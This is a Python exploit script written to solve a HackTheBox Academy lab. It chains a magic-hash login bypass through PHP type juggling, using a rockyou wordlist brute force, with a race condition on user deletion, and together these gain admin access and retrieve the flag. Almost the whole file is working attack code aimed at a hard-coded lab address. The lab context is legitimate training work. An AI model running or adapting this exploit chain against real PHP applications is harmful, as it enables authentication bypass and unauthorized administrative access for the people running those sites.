#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'Whitebox Attacks'. This script chains together exploits of php type juggling using a magic hash --> race condition --> php type juggling.

Explanation of what the script does: 
The script first calculates a magic hash --> then uses the magic hash to exploit php type juggling to login as user 'larry' (non-admin account) --> then exploits a race condition on a 'delete user' function on the site while trying to access the 'admin page' at the same time --> this causes the user role to be set to null --> and finally uses php type juggling on the 'user role' to get the admin page.  This works in getting the admin page due to the admin page having a check in place of: 
"if ($user_data['role'] != 0) { header('Location: profile.php'); exit; }"
Due to the race condition performed, this causes the $user_data['role'] to equal null since it has been deleted in the middle of accessing the admin.php page.  So the check equates to null != 0.  Since the check is using a loose comparison, null does equal to 0 and therefore gets access to the admin page.

Let the script run for a minute or two until the race condition is successful.  
"""

import hashlib
import requests
import aiohttp
import asyncio

# Function to hash the salt and password value
def pw_hash(password):
    salt = 'it6z' # this salt value is given in the sourcecode
    hash_value = hashlib.md5((salt + password).encode()).hexdigest()
    return hash_value

# Function to find a word that when it's hashed with the pw_hash function will create a magic hash 
def find_magic_hash():
    with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as file: 
        count=0
        num=0  # If want to save time on brute force, then change the number to 54 
        for line in file:
            word= line.strip() # If want to save time on brute force, then set the word to lhady01
            if count >1:
                break
            for num in range(1,1000):
                hash_word= pw_hash(f"{word}{num}")
                if hash_word.startswith("0e") and hash_word[2:].isdigit():
                    print(f"Found the hash: {hash_word}.  The bypass for Larry is password: {word}{num}")
                    pwd_larry_bypass= f"{word}{num}"
                    return pwd_larry_bypass
                    count+=1
                    break
                else:
                    pass

# Asynchronous function to perform the race condition and type juggling atttack to get the admin page
async def run_async_requests(post_url_manage, get_url_admin, headers, proxies, cookies, data3):
    async with aiohttp.ClientSession() as session:
        
        # Send request to delete the user
        data6 = "delete="
        delete_task = asyncio.create_task(session.post(post_url_manage, headers=headers, data=data6, proxy=proxies["http"], cookies=cookies, allow_redirects=False))
        
        # Send multiple GET requests to admin.php
        tasks_get_admin = [asyncio.create_task(session.get(get_url_admin, proxy=proxies["http"], allow_redirects=False, cookies=cookies)) for _ in range(5)]
        
        # When the attack is successful it will print the flag from the admin.php page
        responses= await asyncio.gather(delete_task, *tasks_get_admin)
        for response in responses:
            text= await response.text()
            if "HTB" in text:
                for line in text.splitlines():
                    if "HTB" in line:
                        print(line)
                        break
                    else:
                        pass
            else:
                pass

# Run the attacks to get logged in as larry (non-admin account), and then get the admin page            
def type_juggling_race_condition(pwd_larry_bypass):
    proxies={"http":"http://127.0.0.1:8080"}
    headers={"Content-type":"application/x-www-form-urlencoded"}
    target="83.136.252.185:50163"
    session= requests.Session()
    name="test"
    num=0
    
    # Attack #1: Type juggling --> Login as larry using the magic hash 
    data= f"username=larry&password={pwd_larry_bypass}"
    response= session.post(f"http://{target}/login.php", headers=headers, data=data, proxies=proxies, allow_redirects=False)
    
    # Create a user so that we will have a valid login on the next login request
    data2= f"username={name}{num}&password=test&register="
    response= session.post(f"http://{target}/manage.php", headers=headers, data=data2, proxies=proxies, allow_redirects=False)
    
    # Log out
    response=session.get(url=f"http://{target}/logout.php", proxies=proxies, allow_redirects=False)
    
    # Attack #2: Chain race condition attack with type juggling attack to get the admin page
    while True:
        # log in
        username=f"{name}{num}"
        data3= f"username={username}&password=test"
        response= session.post(f"http://{target}/login.php", headers=headers, data=data3, proxies=proxies, allow_redirects=False)
        
        # create a user so will have a valid login on the next round
        num+=1
        data4= f"username={name}{num}&password=test&register="
        response2= session.post(f"http://{target}/manage.php", headers=headers, data=data4, proxies=proxies, allow_redirects=False)

        # Sets the variables for the function run_async_requets and then runs that function
        post_url_manage = f"http://{target}/manage.php"
        get_url_admin = f"http://{target}/admin.php"
        cookies = session.cookies.get_dict()
        asyncio.run(run_async_requests(post_url_manage, get_url_admin, headers, proxies, cookies, data3))

try:
    pwd_larry_bypass= find_magic_hash()
    type_juggling_race_condition(pwd_larry_bypass)
except KeyboardInterrupt:
    print("Ctrl +c detected, exiting gracefully")
